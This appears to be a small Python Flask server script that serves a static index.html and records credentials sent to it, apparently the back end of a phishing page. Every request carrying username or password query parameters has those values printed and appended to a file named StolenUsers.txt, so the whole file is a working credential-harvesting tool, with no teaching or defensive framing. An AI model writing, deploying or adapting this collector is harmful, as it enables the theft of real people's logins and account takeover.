from flask import Flask,request
app = Flask(__name__, static_url_path="", static_folder='')

@app.route('/')
def root():
    username = request.args.get("username",None)
    password = request.args.get("password",None)
    print(f"username={username}\npassword={password}")

    if username != None or password !=None:
        with open("StolenUsers.txt", "at", encoding="utf-8") as file:
            file.write(f"User: {username}, Password: {password}\n")

    return app.send_static_file('index.html')


if __name__ == '__main__':
    app.run()